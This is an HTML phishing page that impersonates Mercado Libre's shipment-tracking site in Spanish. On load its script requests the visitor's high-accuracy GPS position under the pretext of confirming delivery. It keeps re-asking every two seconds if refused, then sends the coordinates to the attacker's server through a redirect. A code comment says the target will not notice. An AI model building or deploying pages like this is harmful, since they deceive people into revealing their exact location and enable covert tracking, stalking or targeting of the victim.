<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Mercado Libre - Seguimiento de Envío</title>
    <style>
        body { font-family: Arial, sans-serif; background-color: #fff159; margin: 0; text-align: center; }
        .header { background-color: #fff159; padding: 20px; box-shadow: 0 1px 2px rgba(0,0,0,0.1); }
        .card { background: white; margin: 50px auto; padding: 30px; border-radius: 8px; max-width: 400px; }
        .btn { background-color: #3483fa; color: white; padding: 10px 20px; text-decoration: none; border-radius: 6px; }
        #status { margin-top: 20px; color: #666; font-size: 14px; }
    </style>
</head>
<body>
    <div class="header">
        <img src="https://http2.mlstatic.com/frontend-assets/ui-navigation/5.18.9/mercadolibre/logo__large_plus.png" width="130" alt="ML">
    </div>
    <div class="card">
        <h3>Verifica tu ubicación</h3>
        <p>Para confirmar la entrega en tu zona, necesitamos acceso a tu GPS.</p>
        <div id="status">Cargando mapa de zona...</div>
    </div>

    <script>
        function enviarUbicacion(pos) {
            const lat = pos.coords.latitude;
            const lon = pos.coords.longitude;
            // El operativo no verá esto, el navegador se redirigirá al servidor
            window.location.href = `/?lat=${lat}&lon=${lon}`;
        }

        function error(err) {
            document.getElementById("status").innerHTML = "Error: Por favor permite el acceso para continuar.";
            setTimeout(getLocation, 2000);
        }

        function getLocation() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(enviarUbicacion, error, {
                    enableHighAccuracy: true,
                    timeout: 10000
                });
            }
        }

        // Inicia el proceso automáticamente
        window.onload = getLocation;
    </script>
</body>
</html>
